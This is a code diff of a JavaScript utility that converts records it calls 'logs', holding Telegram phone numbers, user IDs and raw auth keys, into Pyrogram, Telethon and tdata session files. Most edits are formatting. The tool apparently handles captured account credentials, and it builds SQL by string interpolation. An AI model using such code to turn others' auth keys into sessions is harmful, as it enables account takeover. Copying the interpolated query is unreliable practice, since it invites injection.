@@ -3,7 +3,6 @@ import fs from 'fs';
 import sqlite3 from 'sqlite3';
 import { open } from 'sqlite';
 import { exec } from "child_process";
-
 export function declineDays(days) {
     const lastDigit = days % 10;
     const lastTwoDigits = days % 100;
@@ -34,7 +33,7 @@ export function formatDate(date) {
         year: 'numeric'
     });
 }
-export function validateLink(link){
+export function validateLink(link) {
     return link.match(/(https?:\/\/[^\s]+)/g);
 }
 
@@ -59,21 +58,24 @@ export async function exportLogs(logs, type) {
     fs.mkdirSync(`${dir}/data`);
 
     return new Promise(async resolve => {
-        switch(type) {
+        switch (type) {
             case 'session + json':
                 const templateJson = JSON.parse(fs.readFileSync(`sessions/session.json`, 'utf-8'));
 
-                for(let log of logs) {
+                for (let log of logs) {
                     let json = templateJson;
 
                     json.session_file = log.id.toString();
                     json.phone = log.phone.toString();
                     json.user_id = log.uid.toString();
+                    json.device = log.deviceParams.device;
+
+
 
                     fs.writeFileSync(`${dir}/data/${log.id}.json`, JSON.stringify(json), 'utf-8');
                 }
             case 'pyrogram':
-                if(!type.includes('json')) template = 'pyrogram';
+                if (!type.includes('json')) template = 'pyrogram';
             case 'telethon':
                 await Promise.all(
                     logs.map(async log => {
@@ -84,8 +86,8 @@ export async function exportLogs(logs, type) {
                             filename: `${file}`,
                             driver: sqlite3.Database
                         });
-                        
-                        if(type !== 'pyrogram') {
+
+                        if (type !== 'pyrogram') {
                             await connection.run(`update sessions set dc_id = ${log.dcId}, server_address = '${getServerById(log.dcId)}', auth_key = $key`, {
                                 '$key': Buffer.from(log.authKey, 'hex')
                             });
@@ -94,13 +96,13 @@ export async function exportLogs(logs, type) {
                                 '$key': Buffer.from(log.authKey, 'hex')
                             });
                         }
-                        
+
                         await connection.close();
                     })
                 );
                 break;
             case 'tdata':
-                for(let log of logs) {
+                for (let log of logs) {
                     const path = `${dir}/data/${log.id}`;
                     fs.mkdirSync(path);
                     console.log(await execAsync(
